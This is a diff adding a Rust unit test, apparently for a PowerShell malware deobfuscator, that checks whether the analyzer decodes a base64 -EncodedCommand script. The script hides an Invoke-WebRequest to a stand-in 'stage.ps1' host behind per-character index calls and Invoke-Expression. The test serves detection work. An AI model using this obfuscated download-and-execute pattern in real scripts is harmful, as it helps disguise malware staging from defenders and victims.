@@ -16416,6 +16416,52 @@ Invoke-Expression $cmd"#,
     }
 
     #[test]
+    fn ps1_literal_index_extractor_calls_with_dummy_arg_recover_nested_command() {
+        use base64::Engine;
+
+        fn pick_calls(decoded: &str) -> String {
+            decoded
+                .chars()
+                .map(|ch| format!("(Pick 0 'x{ch}' 1)"))
+                .collect::<Vec<_>>()
+                .join(" + ")
+        }
+
+        let decoded = "Invoke-WebRequest -Uri https://ps-index-dummy-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Pick($unused,$value,$index) {{
+  return $value[$index]
+}}
+$cmd = {}
+Invoke-Expression $cmd"#,
+            pick_calls(decoded)
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://ps-index-dummy-extractor.example/stage.ps1"
+            )
+        });
+        assert!(
+            has,
+            "literal index extractor calls with dummy args were not recursively decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains(decoded),
+            "literal index extractor dummy-arg output was not retained:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn ps1_literal_string_case_extractor_call_recovers_nested_command() {
         use base64::Engine;
 
